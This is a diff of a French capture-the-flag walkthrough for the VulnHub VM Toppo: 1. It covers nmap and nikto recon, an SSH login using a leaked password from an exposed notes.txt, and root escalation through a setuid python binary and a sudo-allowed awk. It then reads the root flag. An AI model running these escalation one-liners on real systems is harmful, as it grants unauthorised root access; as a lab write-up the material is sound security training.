@@ -1,15 +1,15 @@
 # Toppo: 1
 
-[Toppo: 1](https://www.vulnhub.com/entry/toppo-1,245/) est une machine virtuelle vulnérable conçue par [Hadi Mene](https://twitter.com/@h4d3sw0rm). L'objectif, comme toujours, est de trouver et d'exploiter des vulnérabilités sur la VM fournie, afin d'obtenir les privilèges d'administration (root) et de récupérer un flag, preuve de l'intrusion et synonyme de validation du challenge. C'est parti pour ce _walkthrough_ ! Attention, spoilers...
+[Toppo: 1](https://www.vulnhub.com/entry/toppo-1,245/) est une machine virtuelle vulnérable, conçue par [Hadi Mene](https://twitter.com/h4d3s99) et publiée sur VulnHub au mois de juillet 2018. L'objectif, comme toujours, est de trouver et d'exploiter des vulnérabilités sur la VM fournie, afin d'obtenir les privilèges d'administration (root) et de récupérer un flag, preuve de l'intrusion et synonyme de validation du challenge. C'est parti pour ce _walkthrough_ ! Attention, spoilers...
 
-## TED Talks too much
+## Recherche d'informations
 
 L'adresse IP de la VM Toppo nous est gracieusement fournie à l'écran d'ouverture de session : 192.168.56.104.
 
-Toute phase d'attaque commence par une analyse du système cible. Un scan nmap va nous permettre à la fois d'identifier les services installés sur le serveur, et d'obtenir des informations sur le système d'exploitation. Il est ainsi notamment possible de se connecter à distance avec SSH au serveur Toppo, sur le port 22 ; un serveur Web Apache 2.4.25 est par ailleurs installé et en écoute sur le port 80, il semble héberger un blog. 
+Toute phase d'attaque commence par une analyse du système cible. Un scan [__nmap__](https://nmap.org/book/man.html) va nous permettre à la fois d'identifier les services installés sur le serveur, et d'obtenir des informations sur le système d'exploitation. Il est ainsi notamment possible de se connecter à distance avec SSH au serveur Toppo, sur le port 22 ; un serveur Web Apache 2.4.25 est par ailleurs installé et en écoute sur le port 80, il semble héberger un blog. 
 
 ```console
-root@blinils:~/CTF# nmap -sT -sV -p- -A 192.168.56.104
+root@blinils:~# nmap -sT -sV -p- -A 192.168.56.104
 --snip--
 PORT      STATE SERVICE VERSION
 22/tcp    open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
@@ -42,12 +42,10 @@ HOP RTT     ADDRESS
 1   0.71 ms 192.168.56.104
 ```
 
-Quatre articles de blog, un formulaire de contact, et rien de plus à se mettre sous la dent.
-
-Après avoir parcouru manuellement le site, un peu de recherche automatisée ne fera pas de mal avec [nikto](https://cirt.net/nikto2-docs/), un outil d'audit pour serveurs Web.
+Quatre articles de blog, un formulaire de contact, et rien de plus à se mettre sous la dent. Après avoir parcouru manuellement le site, un peu de recherche automatisée ne fera pas de mal avec [__nikto__](https://cirt.net/nikto2-docs/), un outil d'audit pour serveurs Web.
 
 ```console
-root@blinils:~/CTF# nikto -h 192.168.56.104
+root@blinils:~# nikto -h 192.168.56.104
 - Nikto v2.1.6
 ---------------------------------------------------------------------------
 + Target IP:          192.168.56.104
@@ -58,10 +56,7 @@ root@blinils:~/CTF# nikto -h 192.168.56.104
 + Server: Apache/2.4.10 (Debian)
 + Server leaks inodes via ETags, header found with file /, fields: 0x1925 0x563f5cf714e80 
 + The anti-clickjacking X-Frame-Options header is not present.
-+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
-+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
-+ No CGI Directories found (use '-C all' to force check all possible dirs)
-+ Apache/2.4.10 appears to be outdated (current is at least Apache/2.4.12). Apache 2.0.65 (final release) and 2.2.29 are also current.
+--snip--
 + Allowed HTTP Methods: OPTIONS, GET, HEAD, POST 
 + OSVDB-3268: /admin/: Directory indexing found.
 + OSVDB-3092: /admin/: This might be interesting...
@@ -78,19 +73,20 @@ root@blinils:~/CTF# nikto -h 192.168.56.104
 + 1 host(s) tested
 ```
 
-Le [_Directory Listing_](https://www.it-connect.fr/quest-ce-que-le-directory-browsinglisting/) est activé sur le serveur, et ça tombe bien, le répertoire /admin/ contient un unique fichier notes.txt.
+Le [_directory listing_](https://www.it-connect.fr/quest-ce-que-le-directory-browsinglisting/) est activé sur le serveur, et ça tombe bien, le répertoire ```/admin/``` contient un unique fichier ```notes.txt```.
 
 ```console
-root@blinils:~/CTF# curl http://192.168.56.104/admin/notes.txt
+root@blinils:~# curl http://192.168.56.104/admin/notes.txt
 Note to myself :
 
-I need to change my password :/ 12345ted123 is too outdated but the technology isn't my thing i prefer go fishing or watching soccer .
+I need to change my password :/ 12345ted123 is too outdated but 
+the technology isn't my thing i prefer go fishing or watching soccer .
 ```
 
-À défaut d'avoir trouvé une mire d'authentification sur le blog, j'ai tenté de me connecter en SSH... oui mais avec quel utilisateur ? Après de (très) nombreux essais infructueux avec différentes listes [(1)](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names) [(2)](https://github.com/insidetrust/statistically-likely-usernames) [(3)](https://github.com/jeanphorn/wordlist) glanées sur Github, j'ai tenté ted. Juste ted, comme dans le mot de passe... et ça a marché. Damn!
+À défaut d'avoir trouvé une mire d'authentification sur le blog, j'ai tenté de me connecter en SSH... oui mais avec quel utilisateur ? Après de (très) nombreux essais infructueux avec différentes listes [(1)](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names) [(2)](https://github.com/insidetrust/statistically-likely-usernames) [(3)](https://github.com/jeanphorn/wordlist) glanées sur Github, j'ai tenté ```ted```. Juste ```ted```, comme dans le mot de passe... et ça a marché. Damn!
 
 ```console
-root@blinils:~/CTF# ssh ted@192.168.56.104
+root@blinils:~# ssh ted@192.168.56.104
 ted@192.168.56.104's password: 
 
 The programs included with the Debian GNU/Linux system are free software;
@@ -107,9 +103,9 @@ uid=1000(ted) gid=1000(ted) groups=1000(ted),24(cdrom),25(floppy),29(audio),30(d
 ted@Toppo:~$
 ```
 
-## Un petit Toppo sur la situation
+## À l'affût d'une élévation de privilèges avec linuxprivchecker.py
 
-Le script [linuxprivchecker.py](https://github.com/sleventyeleven/linuxprivchecker) développé par Mike Czumak (@SecuritySift) va scanner un certain nombre d'éléments sur le serveur : configuration de la machine, version du noyau Linux, listing des utilisateurs et de leurs privilèges, fichiers aux droits trop permissifs... et renvoie à la fin du scan une liste d'exploits censés permettre une élévation de privilèges.
+Le script [__linuxprivchecker.py__](https://github.com/sleventyeleven/linuxprivchecker) développé par Mike Czumak (@SecuritySift) va scanner un certain nombre d'éléments sur le serveur : configuration de la machine, version du noyau Linux, listing des utilisateurs et de leurs privilèges, fichiers aux droits trop permissifs... et renvoie à la fin du scan une liste d'exploits censés permettre une élévation de privilèges.
 
 ```console
 ted@Toppo:~$ wget -q http://192.168.56.102:8000/linuxprivchecker.py
@@ -150,9 +146,11 @@ LINUX PRIVILEGE ESCALATION CHECKER
 --snip--
 ```
 
-WHAT! La valeur de mon [euid](http://www.linux-france.org/article/dalox/unix03.htm) est 0, et je peux lire le contenu du répertoire /root. Par quel miracle ?
+WHAT! La valeur de mon [euid](http://www.linux-france.org/article/dalox/unix03.htm) est 0, et je peux lire le contenu du répertoire ```/root```. Par quel miracle ?
 
 ```console
+ted@Toppo:~$ python linuxprivchecker.py
+
 --snip--
 
 [+] SUID/SGID Files and Directories
@@ -168,9 +166,9 @@ WHAT! La valeur de mon [euid](http://www.linux-france.org/article/dalox/unix03.h
 --snip--
 ```
 
-Waouh ! Grâce au (ou plutôt à cause du) [setuid](https://tech.feub.net/2008/03/setuid-setgid-et-sticky-bit/) positionné sur le binaire python, qui appartient à root. En résumé, lorsque l'utilisateur ted (ou un autre utilisateur) exécute une commande python, celle-ci est lancée avec les droits root. À nous les droits root et le fichier flag.txt ! Plusieurs possibilités s'offrent alors à nous.
+Waouh ! Grâce au (ou plutôt à cause du) [setuid](https://tech.feub.net/2008/03/setuid-setgid-et-sticky-bit/) positionné sur le binaire python, qui appartient à root. En résumé, lorsque l'utilisateur ted exécute une commande python, celle-ci est lancée avec les droits root. À nous les droits root et le fichier ```flag.txt``` ! Plusieurs possibilités s'offrent alors à nous.
 
-## Monsieur et Madame evenuroot ont un fils
+### Élévation de privilèges avec le binaire python (bit SUID)
 
 ```console
 ted@Toppo:~$ id
@@ -182,7 +180,9 @@ ted@Toppo:~$ python -c 'import pty; pty.spawn("/bin/sh")'
 uid=1000(ted) gid=1000(ted) euid=0(root) groups=1000(ted),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),114(bluetooth)
 ```
 
-Il est également possible de se servir de l'information fournie par le fichier /etc/sudoers.
+### Élévation de privilèges avec le binaire awk (configuration sudo)
+
+Il est également possible de se servir de l'information fournie par le fichier ```/etc/sudoers```.
 
 ```console
 ted@Toppo:~$ ls -al /usr/bin/awk
@@ -209,7 +209,7 @@ uid=0(root) gid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44
 397 /root/flag.txt
 ```
 
-En bonus, la version rapide... et en parallèle, John The Ripper a trouvé les 7 lettres du mot de passe de root en 7 secondes.
+En bonus, la version rapide... et en parallèle, [__John The Ripper__](https://www.openwall.com/john/) a trouvé les 7 lettres du mot de passe de root en 7 secondes.
 
 ```console
 ted@Toppo:~$ python -c "f=open('/root/flag.txt','r');print f.read();f.close();"
@@ -217,4 +217,4 @@ ted@Toppo:~$ python -c "f=open('/root/flag.txt','r');print f.read();f.close();"
 [REDACTED]
 ```
 
-Voilà qui conclut ce walkthrough, merci à Hadi Mene sur sa VM boot2root Toppo: 1 !
+Voilà qui conclut ce _walkthrough_, merci à [Hadi Mene](https://twitter.com/h4d3s99) sur sa VM _boot2root_ Toppo: 1 !
